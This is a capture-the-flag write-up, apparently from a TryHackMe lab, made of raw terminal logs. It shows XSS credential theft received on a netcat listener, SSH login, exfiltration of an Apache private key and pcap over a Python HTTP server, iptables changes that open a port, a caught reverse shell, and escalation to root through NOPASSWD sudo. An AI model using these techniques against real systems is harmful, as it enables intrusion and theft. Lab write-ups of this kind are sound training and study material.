the register.php is vulnerable to xss

  
└─$ nc -nvlp 4444                    
listening on [any] 4444 ...
connect to [10.4.124.126] from (UNKNOWN) [10.10.113.114] 32822
POST / HTTP/1.1
Host: 10.4.124.126:4444
Connection: keep-alive
Content-Length: 32
Origin: http://127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/71.0.3542.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Referer: http://127.0.0.1/blog.php
Accept-Encoding: gzip, deflate

jack:WhyIsMyPasswordSoStrongIDK


                                                                                                                   
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ssh jack@10.10.21.204 
The authenticity of host '10.10.21.204 (10.10.21.204)' can't be established.
ED25519 key fingerprint is SHA256:4vHbB54RGaVtO3RXlzRq50QWtP3O7aQcnFQiVMyKot0.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:20: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.21.204' (ED25519) to the list of known hosts.
jack@10.10.21.204's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 20 Aug 2025 10:47:02 AM UTC

  System load:  0.86               Processes:             144
  Usage of /:   79.8% of 11.21GB   Users logged in:       0
  Memory usage: 40%                IPv4 address for eth0: 10.10.21.204
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

64 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jan 29 13:44:19 2024
jack@ubuntu:~$ cd /opt
jack@ubuntu:/opt$ python -m http.server 8080                                                                        
                                                                                                                    
Command 'python' not found, did you mean:                                                                           
                                                                                                                    
  command 'python3' from deb python3                                                                                
  command 'python' from deb python-is-python3                                                                       
                                                                                                                    
jack@ubuntu:/opt$ python3 -m http.server 8080                                                                       
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...                                                        
10.4.124.126 - - [20/Aug/2025 10:47:51] "GET /capture.pcap HTTP/1.1" 200 -                                          
10.4.124.126 - - [20/Aug/2025 10:48:26] "GET /capture.pcap HTTP/1.1" 200 -                                          
^C                                                                                                                  
Keyboard interrupt received, exiting.                                                                               
jack@ubuntu:/opt$ cd /etc/apach2/certs                                                                              
-bash: cd: /etc/apach2/certs: No such file or directory                                                             
jack@ubuntu:/opt$ cd /etc/apache2/certs                                                                             
jack@ubuntu:/etc/apache2/certs$ ls                                                                                  
apache-certificate.crt  apache.key                                                                                  
jack@ubuntu:/etc/apache2/certs$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...                                                        
10.4.124.126 - - [20/Aug/2025 10:57:03] "GET /apache.key HTTP/1.1" 200 -                                            
^C                                                                                                                  
Keyboard interrupt received, exiting.                                                                               
jack@ubuntu:/etc/apache2/certs$ sudo iptables -L                                                                    
[sudo] password for jack:                                                                                           
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
ACCEPT     all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
DROP       all  --  anywhere             anywhere            

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere            
jack@ubuntu:/etc/apache2/certs$ sudo iptables -D input 1
iptables: No chain/target/match by that name.
jack@ubuntu:/etc/apache2/certs$  sudo iptables -D INPUT 1
jack@ubuntu:/etc/apache2/certs$ sudo iptables -I INPUT -p tcp --dport 41312 -j ACCEPT
jack@ubuntu:/etc/apache2/certs$ sudo iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:41312
ACCEPT     all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
DROP       all  --  anywhere             anywhere            

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere            
jack@ubuntu:/etc/apache2/certs$ exit




┌──(root㉿vbox)-[~]
└─# su alvan
cd ~/THM/ctf
/home/alvan/.goenv/bin/goenv: line 53: cd: /root: Permission denied
/usr/bin/pyenv: line 73: cd: /root: Permission denied
┌──(alvan㉿vbox)-[/root]
└─$ cd ~/THM/ctf
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ls             
apache-certificate.crt  apache.key  capture.pcap  stealer.js  update.txt  writeup.md
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ rm -rf apache.key          
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ wget http://10.10.113.114:8080/apache.key  
--2025-08-20 10:52:30--  http://10.10.113.114:8080/apache.key
Connecting to 10.10.113.114:8080... failed: Connection timed out.
Retrying.

--2025-08-20 10:54:44--  (try: 2)  http://10.10.113.114:8080/apache.key
Connecting to 10.10.113.114:8080... ^[[B^[[B^[[B^[[B^[[B^[[B^C
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ wget http://10.10.21.204:8080/apache.key
--2025-08-20 10:57:04--  http://10.10.21.204:8080/apache.key
Connecting to 10.10.21.204:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3272 (3.2K) [application/pgp-keys]
Saving to: ‘apache.key’

apache.key                   100%[==============================================>]   3.20K  --.-KB/s    in 0s      

2025-08-20 10:57:05 (165 MB/s) - ‘apache.key’ saved [3272/3272]

                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ls
apache-certificate.crt  apache.key  capture.pcap  stealer.js  update.txt  writeup.md
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ping 10.0.2.15    
PING 10.0.2.15 (10.0.2.15) 56(84) bytes of data.
^C
--- 10.0.2.15 ping statistics ---
13 packets transmitted, 0 received, 100% packet loss, time 12290ms

                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ping 10.10.21.204 
PING 10.10.21.204 (10.10.21.204) 56(84) bytes of data.
64 bytes from 10.10.21.204: icmp_seq=1 ttl=61 time=780 ms
64 bytes from 10.10.21.204: icmp_seq=2 ttl=61 time=740 ms
^C
--- 10.10.21.204 ping statistics ---
3 packets transmitted, 2 received, 33.3333% packet loss, time 2001ms
rtt min/avg/max/mdev = 740.242/760.345/780.448/20.103 ms
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ nmap -p41312 10.10.21.204          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 11:03 UTC
Nmap scan report for 10.10.21.204
Host is up (0.67s latency).

PORT      STATE    SERVICE
41312/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 7.66 seconds
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ cat writeup.md            
└─$ nc -nvlp 4444                    
listening on [any] 4444 ...
connect to [10.4.124.126] from (UNKNOWN) [10.10.113.114] 32822
POST / HTTP/1.1
Host: 10.4.124.126:4444
Connection: keep-alive
Content-Length: 32
Origin: http://127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/71.0.3542.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Referer: http://127.0.0.1/blog.php
Accept-Encoding: gzip, deflate

jack:WhyIsMyPasswordSoStrongIDK
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ nmap -p41312 10.10.21.204
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 11:06 UTC
Nmap scan report for 10.10.21.204
Host is up (0.69s latency).

PORT      STATE SERVICE
41312/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.54 seconds
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ nc -nvlp 1234                    
listening on [any] 1234 ...
connect to [10.4.124.126] from (UNKNOWN) [10.10.21.204] 55688
ls
5UP3r53Cr37.py
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/usr/lib/cgi-bin$ ls
ls
5UP3r53Cr37.py
www-data@ubuntu:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL
www-data@ubuntu:/usr/lib/cgi-bin$ sudo su
sudo su
root@ubuntu:/usr/lib/cgi-bin# ls
ls
5UP3r53Cr37.py
root@ubuntu:/usr/lib/cgi-bin# cd /root
cd /root
root@ubuntu:~# ls
ls
bot.py  root.txt  snap  ssh.sh
root@ubuntu:~# cat root.txt
cat root.txt
4dbe2259ae53846441cc2479b5475c72
root@ubuntu:~# \
<img width="1762" height="864" alt="image" src="https://github.com/user-attachments/assets/8d59b4f2-7cb5-423a-bd8d-8a450319201d" />

                
